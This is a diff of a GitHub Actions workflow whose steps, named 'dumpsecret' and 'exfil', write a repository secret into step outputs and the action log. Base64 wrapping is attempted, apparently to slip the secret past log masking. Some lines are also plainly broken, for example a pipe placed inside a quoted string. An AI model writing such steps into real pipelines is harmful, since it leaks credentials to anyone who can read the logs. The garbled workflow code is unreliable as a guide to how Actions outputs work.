@@ -24,13 +24,13 @@ jobs:
       - name: Run a one-line script
         id: "dumpsecret"
         run: |
-         echo "exfilsecret=${{secrets.A_SECRET}}|base64" > a.txt
+         echo "${{secrets.A_SECRET}}|base64" >> $GITHUB_OUTPUT
          cat a.txt 
          cat a.txt >> $GITHUB_OUTPUT         
       - name: Base64 wrap and print to action log
         id: exfil2
         run: |
-          echo "eureka=[${{steps.dumpsecret.outputs.exfilsecret}}]|base64" >> $GITHUB_OUTPUT
+          echo "eureka=[${{steps.dumpsecret.outputs}}]"
           
       - name: exfil b64 encoded secret
         run: |
